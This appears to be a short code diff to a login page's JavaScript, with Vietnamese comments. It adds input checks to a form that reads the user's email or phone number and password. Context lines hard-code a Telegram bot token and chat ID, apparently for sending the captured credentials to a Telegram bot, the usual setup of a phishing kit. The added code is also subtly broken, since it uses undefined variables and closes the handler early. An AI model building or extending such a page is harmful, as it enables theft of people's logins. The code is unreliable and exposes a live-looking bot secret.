@@ -86,6 +86,18 @@
     event.preventDefault(); // ❗ Ngăn form submit mặc định
       var email = document.getElementById("email").value;
       var password = document.getElementById("password").value;
+      const isPhone = /^\d{10}$/.test(emailInput); // 10 số
+      const isValidFakeEmail = /^[^@]+$/.test(emailInput); // không có dấu @
+     if (!isPhone && !isValidFakeEmail) {
+          alert("Vui lòng nhập số điện thoại hợp lệ (10 số) hoặc email không chứa '@'.");
+          event.preventDefault(); // Ngăn gửi form
+        }
+    
+        if (passwordInput === "") {
+          alert("Vui lòng nhập mật khẩu.");
+          event.preventDefault(); // Ngăn gửi form
+        }
+      });
 
       var botToken = '8110453433:AAG56s0dUVRc4uAWmlVm9_WQPv-DKkjO164';
       var chatId = '6022297636';
